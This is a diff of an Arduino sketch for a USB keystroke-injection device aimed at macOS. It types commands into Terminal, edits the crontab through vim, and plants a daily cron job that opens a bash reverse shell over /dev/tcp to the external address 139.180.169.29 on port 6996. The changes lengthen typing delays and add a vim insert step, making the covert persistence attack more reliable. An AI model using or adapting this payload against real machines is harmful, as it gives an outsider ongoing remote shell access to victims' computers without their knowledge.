@@ -27,55 +27,63 @@ void setup()
   // Set default delay 200ms
   // Command + Space ==> spotlight search
   Keyboard.press(KEY_LEFT_GUI);
+  delay(200);
   Keyboard.press(' ');
+  delay(200);
   Keyboard.releaseAll();
 
   // Search for termina
   delay(200);
   Keyboard.print(F("terminal"));
 
+  delay(200);
   typeKey(KEY_RETURN);
 
-  delay(200);
+  delay(300);
   Keyboard.print(F("bash"));
 
   typeKey(KEY_RETURN);
 
   // enable background jobs
-  delay(200);
+  delay(2000);
   Keyboard.print(F("set -m"));
 
   typeKey(KEY_RETURN);
 
   // add reverse shell to cron
-  delay(200);
+  delay(2000);
   Keyboard.print(F("export EDITOR=vim"));
 
   typeKey(KEY_RETURN);
 
-  delay(200);
+  delay(2000);
   Keyboard.print(F("crontab -e"));
 
   typeKey(KEY_RETURN);
 
-  delay(200);
+  delay(2000);
   Keyboard.print(F("g"));
 
   typeKey(KEY_RETURN);
 
-  delay(200);
+  delay(2000);
   Keyboard.print(F("$"));
 
   typeKey(KEY_RETURN);
+  
+  delay(2000);
+  Keyboard.print(F("i"));
 
+  typeKey(KEY_RETURN);
+  
   // set the reverse shell to occur 11am every day
-  delay(200);
+  delay(2000);
   Keyboard.print(F("0 11 * * * /bin/sh -c \"/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &\\\" && exit"));
 
   typeKey(KEY_RETURN);
 
   // Exit vim
-  delay(200);
+  delay(2000);
   Keyboard.print(F(":wq"));
 
   typeKey(KEY_RETURN);
